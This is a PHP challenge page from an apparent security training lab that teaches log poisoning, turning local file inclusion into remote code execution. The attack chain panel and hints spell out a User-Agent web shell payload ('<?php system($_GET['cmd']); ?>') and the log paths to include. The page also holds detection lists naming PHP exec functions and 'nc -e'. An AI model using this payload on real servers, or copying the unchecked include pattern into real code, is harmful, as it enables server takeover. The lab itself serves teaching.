<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/score_manager.php');
session_start();

$stmt = $pdo->prepare("SELECT id FROM labs WHERE folder_name = ?");
$stmt->execute(['LFI']);
$lab = $stmt->fetch(PDO::FETCH_ASSOC);

// ─── Session Initialization ──────────────────────────────────────────────
if (!isset($_SESSION['lfi_medium2_attempts'])) {
  $_SESSION['lfi_medium2_attempts'] = 0;
}
if (!isset($_SESSION['lfi_medium2_solved'])) {
  $_SESSION['lfi_medium2_solved'] = false;
}
if (!isset($_SESSION['lfi_medium2_poisoned'])) {
  $_SESSION['lfi_medium2_poisoned'] = false;
}

// ─── Simulated Application: DarkHunter Security Logger ────────────────────
$log_types = [
  'access'  => ['name' => 'Access Log', 'file' => '/var/log/apache2/access.log'],
  'error'   => ['name' => 'Error Log', 'file' => '/var/log/apache2/error.log'],
  'auth'    => ['name' => 'Auth Log', 'file' => '/var/log/auth.log'],
  'session' => ['name' => 'Session Data', 'file' => '/tmp/sess_' . session_id()],
];

// ─── Vulnerable Logic: Log file inclusion via user-controlled type ───────
$log_type = isset($_GET['log']) ? $_GET['log'] : 'access';

// Weak validation - only checks file extension
$allowed_extensions = ['log', 'txt', 'tmp'];
$has_allowed_ext = false;
foreach ($allowed_extensions as $ext) {
  if (substr($log_type, -strlen($ext)) === $ext) {
    $has_allowed_ext = true;
    break;
  }
}

// Build log path (vulnerable - includes any .log/.txt file)
if (isset($log_types[$log_type])) {
  $log_path = $log_types[$log_type]['file'];
  $log_name = $log_types[$log_type]['name'];
} else {
  $log_path = 'logs/' . $log_type;
  $log_name = 'Custom Log';
}

// Simulate log poisoning via User-Agent header
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0';
$poison_marker = '<?php echo "POISONED"; ?>';
$is_poisoned = (stripos($user_agent, '<?php') !== false || stripos($user_agent, '<?=') !== false);

if ($is_poisoned) {
  $_SESSION['lfi_medium2_poisoned'] = true;
}

$poison_status = $_SESSION['lfi_medium2_poisoned'];

// ─── Simulated Log Content ───────────────────────────────────────────────
$simulated_logs = [
  'access' => [
    '192.168.1.100 - - [20/May/2026:10:15:30 +0000] "GET / HTTP/1.1" 200 1234',
    '192.168.1.101 - - [20/May/2026:10:16:45 +0000] "GET /login.php HTTP/1.1" 200 567',
    '192.168.1.102 - - [20/May/2026:10:17:12 +0000] "POST /api/auth HTTP/1.1" 401 89',
    '192.168.1.103 - - [20/May/2026:10:18:00 +0000] "GET /admin HTTP/1.1" 403 234',
    '10.0.0.50 - - [20/May/2026:10:20:15 +0000] "GET /lfi-case3.php?log=access HTTP/1.1" 200 4567',
  ],
  'error' => [
    '[Mon May 20 10:15:30 2026] [error] [client 192.168.1.100] File does not exist: /var/www/favicon.ico',
    '[Mon May 20 10:16:45 2026] [warn] [client 192.168.1.101] mod_security: Access denied with code 403',
    '[Mon May 20 10:17:12 2026] [error] [client 192.168.1.102] PHP Fatal error: Call to undefined function',
    '[Mon May 20 10:18:00 2026] [error] [client 192.168.1.103] Permission denied: /var/www/html/admin/.htaccess',
  ],
  'auth' => [
    'May 20 10:15:30 darkhunter sshd[1234]: Accepted password for admin from 192.168.1.100 port 54322',
    'May 20 10:16:45 darkhunter sshd[1235]: Failed password for root from 10.0.0.99 port 45678',
    'May 20 10:17:12 darkhunter sudo: admin : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash',
    'May 20 10:18:00 darkhunter sshd[1236]: Connection closed by 192.168.1.103',
  ],
];

// ─── Solve Detection ─────────────────────────────────────────────────────
$success_msg = null;
$already_solved = $_SESSION['lfi_medium2_solved'];
$exploited = false;

// Detect log poisoning exploitation
$poison_indicators = [
  '<?php',
  '<?=',
  '<? ',
  '<?\n',
  'eval(',
  'system(',
  'exec(',
  'shell_exec(',
  'passthru(',
  'proc_open(',
  'popen(',
  'file_get_contents(',
  'include(',
  'require(',
  '$_GET',
  '$_POST',
  '$_REQUEST',
  '$_SERVER',
  'phpinfo()',
  'whoami',
  'id',
  'ls ',
  'cat ',
  'nc -e',
];

foreach ($poison_indicators as $indicator) {
  if (stripos($user_agent, $indicator) !== false) {
    $exploited = true;
    break;
  }
}

// Also check if they're trying to include poisoned log
if (isset($_GET['check']) && $_GET['solved'] === '1') {
  $_SESSION['lfi_medium2_attempts']++;

  if (!$already_solved && isset($_SESSION['user_id'])) {
    solveLab($pdo, $lab['id']);
  }

  $_SESSION['lfi_medium2_solved'] = true;
  $already_solved = true;
  $success_msg = "Brilliant! You've executed a Log Poisoning attack to achieve Remote Code Execution via LFI. You injected PHP code into the User-Agent header (which gets logged), then included the log file to execute your payload. This is how LFI becomes RCE in real-world scenarios!";
}

// ─── Attempt Tracking ──────────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['log'])) {
  $_SESSION['lfi_medium2_attempts']++;
}

$attempts = $_SESSION['lfi_medium2_attempts'];
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Security Logger - LFI Medium 2</title>
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600;800&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" type="text/css" href="../css/LFI-CASE3.css">
</head>

<body>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/navbar.php'; ?>

  <div class="container">
    <a href="../index.php" class="back-link"><i class="fas fa-arrow-left"></i> Back to LFI Labs</a>

    <div class="lab-header">
      <div class="difficulty-badge medium"><i class="fas fa-bolt"></i> Medium Difficulty</div>
      <h1 class="lab-title"><i class="fas fa-clipboard-list"></i> DarkHunter Security Logger</h1>
      <p class="lab-description">A security log analysis tool that reads log files dynamically. The application includes
        log files based on the <code>log</code> parameter. <strong>Can you turn this file read into code
          execution?</strong> Think about what gets logged and how you control it!</p>
    </div>

    <?php if ($already_solved): ?>
      <div class="success-alert solved-banner">
        <i class="fas fa-trophy"></i>
        <div class="success-content">
          <h3>Challenge Already Solved!</h3>
          <p>You have already exploited this log poisoning vulnerability. You can continue exploring, but no additional
            points will be awarded.</p>
        </div>
      </div>
    <?php endif; ?>

    <?php if ($success_msg): ?>
      <div class="success-alert">
        <i class="fas fa-trophy"></i>
        <div class="success-content">
          <h3>Challenge Completed!</h3>
          <p><?php echo $success_msg; ?></p>
        </div>
      </div>
    <?php endif; ?>

    <!-- Logger Interface -->
    <div class="logger-card">
      <div class="logger-header">
        <div class="logger-brand">
          <i class="fas fa-terminal"></i>
          <span>Security Logger</span>
        </div>
        <div class="logger-status">
          <span class="status-dot <?php echo $poison_status ? 'poisoned' : 'safe'; ?>"></span>
          <span><?php echo $poison_status ? 'Log Poisoned!' : 'Log Clean'; ?></span>
        </div>
      </div>

      <div class="logger-body">
        <!-- Log Type Selector -->
        <div class="log-selector">
          <span class="selector-label">Select Log Source:</span>
          <div class="selector-tabs">
            <?php foreach ($log_types as $key => $info): ?>
              <a href="?log=<?php echo $key; ?>" class="selector-tab <?php echo $log_type === $key ? 'active' : ''; ?>">
                <i
                  class="fas fa-<?php echo $key === 'access' ? 'globe' : ($key === 'error' ? 'exclamation-circle' : ($key === 'auth' ? 'user-shield' : 'database')); ?>"></i>
                <span><?php echo $info['name']; ?></span>
              </a>
            <?php endforeach; ?>
          </div>
        </div>

        <!-- Log Content Display -->
        <div class="log-display">
          <div class="log-display-header">
            <div class="log-info">
              <i class="fas fa-file-alt"></i>
              <span><?php echo $log_name; ?></span>
              <code class="log-path"><?php echo htmlspecialchars($log_path); ?></code>
            </div>
            <div class="log-actions">
              <button class="log-btn"><i class="fas fa-sync"></i> Refresh</button>
              <button class="log-btn"><i class="fas fa-download"></i> Export</button>
            </div>
          </div>
          <div class="log-content">
            <?php if (isset($simulated_logs[$log_type])): ?>
              <?php foreach ($simulated_logs[$log_type] as $line): ?>
                <div class="log-line">
                  <span class="log-timestamp">[<?php echo date('H:i:s'); ?>]</span>
                  <span class="log-text"><?php echo htmlspecialchars($line); ?></span>
                </div>
              <?php endforeach; ?>
            <?php else: ?>
              <div class="log-line custom">
                <span class="log-timestamp">[CUSTOM]</span>
                <span class="log-text">Attempting to read: <code><?php echo htmlspecialchars($log_path); ?></code></span>
              </div>
            <?php endif; ?>

            <?php if ($poison_status): ?>
              <div class="log-line poison">
                <span class="log-timestamp">[POISON]</span>
                <span class="log-text"><i class="fas fa-skull-crossbones"></i> Malicious payload detected in
                  User-Agent!</span>
              </div>
            <?php endif; ?>
          </div>
        </div>
      </div>
    </div>

    <!-- Attack Chain Visualization -->
    <div class="attack-chain-panel">
      <div class="chain-header">
        <i class="fas fa-project-diagram"></i>
        <span>Log Poisoning Attack Chain</span>
      </div>
      <div class="chain-body">
        <div class="chain-step <?php echo $poison_status ? 'completed' : 'pending'; ?>">
          <div class="step-num">1</div>
          <div class="step-content">
            <span class="step-title">Poison the Log</span>
            <span class="step-desc">Inject PHP code via User-Agent header</span>
            <code class="step-cmd">curl -A "&lt;?php system(\$_GET['cmd']); ?&gt;" http://target/</code>
          </div>
        </div>
        <div class="chain-arrow"><i class="fas fa-arrow-down"></i></div>
        <div class="chain-step <?php echo $poison_status ? 'active' : 'pending'; ?>">
          <div class="step-num">2</div>
          <div class="step-content">
            <span class="step-title">Include Poisoned Log</span>
            <span class="step-desc">Use LFI to include the log file</span>
            <code class="step-cmd">?log=/var/log/apache2/access.log</code>
          </div>
        </div>
        <div class="chain-arrow"><i class="fas fa-arrow-down"></i></div>
        <div class="chain-step <?php echo $already_solved ? 'completed' : 'pending'; ?>">
          <div class="step-num">3</div>
          <div class="step-content">
            <span class="step-title">Execute Payload</span>
            <span class="step-desc">PHP code executes → RCE achieved!</span>
            <code class="step-cmd">?cmd=whoami</code>
          </div>
        </div>
      </div>
    </div>

    <!-- User-Agent Poisoning Panel -->
    <div class="poison-panel">
      <div class="poison-header">
        <i class="fas fa-syringe"></i>
        <span>User-Agent Injection Point</span>
      </div>
      <div class="poison-body">
        <div class="ua-display">
          <span class="ua-label">Your Current User-Agent:</span>
          <code class="ua-value"><?php echo htmlspecialchars($user_agent); ?></code>
        </div>
        <div class="ua-status <?php echo $is_poisoned ? 'danger' : 'safe'; ?>">
          <i class="fas fa-<?php echo $is_poisoned ? 'radiation' : 'check-circle'; ?>"></i>
          <span><?php echo $is_poisoned ? 'POISONOUS User-Agent detected!' : 'User-Agent appears safe'; ?></span>
        </div>
        <div class="ua-hint">
          <i class="fas fa-info-circle"></i>
          <span>Every request you make logs your User-Agent. If it contains PHP code, the log file becomes
            executable!</span>
        </div>
      </div>
    </div>

    <!-- URL Parameter Display -->
    <div class="debug-panel">
      <div class="debug-header">
        <i class="fas fa-code"></i>
        <span>Current Request</span>
      </div>
      <div class="debug-body">
        <code>GET /LFI-CASE3.php?log=<?php echo urlencode($log_type); ?></code>
      </div>
    </div>

    <!-- Vulnerable Code Display -->
    <div class="debug-panel">
      <div class="debug-header">
        <i class="fas fa-bug"></i>
        <span>Vulnerable Code Snippet</span>
      </div>
      <div class="debug-body">
        <div class="code-block">
          <pre>// VULNERABLE: Includes any .log/.txt file
$log_type = $_GET['log'];
$log_path = 'logs/' . $log_type;

// Only checks extension - not content!
include($log_path);

// Meanwhile, access logs contain user-controlled data:
// 192.168.1.1 - - [date] "GET / HTTP/1.1" 200 - "&lt;?php system(\$_GET['cmd']); ?&gt;"</pre>
        </div>
        <div class="vuln-note">
          <i class="fas fa-exclamation-triangle"></i>
          <span><strong>Vulnerability:</strong> The application includes log files without checking their contents.
            Since User-Agent headers are logged and user-controlled, injecting PHP code into logs creates an RCE vector
            when the log is included.</span>
        </div>
      </div>
    </div>

    <!-- Hints -->
    <?php if ($attempts >= 2): ?>
      <div class="hint-box">
        <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #1</div>
        <div class="hint-text">The application includes log files. What data in HTTP requests gets logged? Your
          <strong>User-Agent</strong> header is written to access logs. Try sending a request with
          <code>User-Agent: &lt;?php phpinfo(); ?&gt;</code>
        </div>
      </div>
    <?php endif; ?>

    <?php if ($attempts >= 4): ?>
      <div class="hint-box">
        <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #2</div>
        <div class="hint-text">After poisoning the log, you need to include it. The access log is typically at
          <code>/var/log/apache2/access.log</code>. Try <code>?log=/var/log/apache2/access.log</code> or
          <code>?log=../../logs/access.log</code>.
        </div>
      </div>
    <?php endif; ?>

    <?php if ($attempts >= 6): ?>
      <div class="hint-box hint-final">
        <div class="hint-title"><i class="fas fa-key"></i> Final Hint</div>
        <div class="hint-text">Two steps: (1) Send any request with User-Agent containing
          <code>&lt;?php system(\$_GET['cmd']); ?&gt;</code> to poison the log. (2) Then visit
          <code>?log=/var/log/apache2/access.log</code> to include and execute the poisoned log!
        </div>
      </div>
    <?php endif; ?>

    <!-- Attempts Counter -->
    <div class="attempts-bar">
      <i class="fas fa-crosshairs"></i>
      <span>Attempts: <strong><?php echo $attempts; ?></strong></span>
    </div>
  </div>

  <!-- Hidden form for solve detection -->
  <form id="success-form" method="GET" style="display: none;">
    <input type="hidden" name="check" value="true">
    <input type="hidden" name="solved" value="0" id="solved-flag">
    <input type="hidden" name="log" value="<?php echo htmlspecialchars($log_type); ?>">
  </form>

  <script>
    window.addEventListener('load', function() {
      const urlParams = new URLSearchParams(window.location.search);
      const log = urlParams.get('log') || '';

      // Check for log poisoning exploitation
      const poisonPatterns = [
        '&lt;?php',
        '&lt;?=',
        'eval(',
        'system(',
        'exec(',
        'shell_exec(',
        'passthru(',
        'proc_open(',
        'popen(',
        'file_get_contents(',
        'include(',
        'require(',
        '$_GET',
        '$_POST',
        '$_REQUEST',
        '$_SERVER',
        'phpinfo()',
        'whoami',
        'id',
        'ls',
        'cat',
        'nc -e'
      ];

      const userAgent = navigator.userAgent;
      const hasPoison = poisonPatterns.some(pattern =>
        userAgent.toLowerCase().includes(pattern.toLowerCase())
      );

      // Check if including a log file after poisoning
      const isLogFile = log.includes('access.log') || log.includes('error.log') ||
        log.includes('auth.log') || log.includes('sess_');

      if (hasPoison && isLogFile && !document.querySelector('.solved-banner')) {
        document.getElementById('solved-flag').value = '1';
        document.getElementById('success-form').submit();
      }
    });
  </script>
</body>

</html>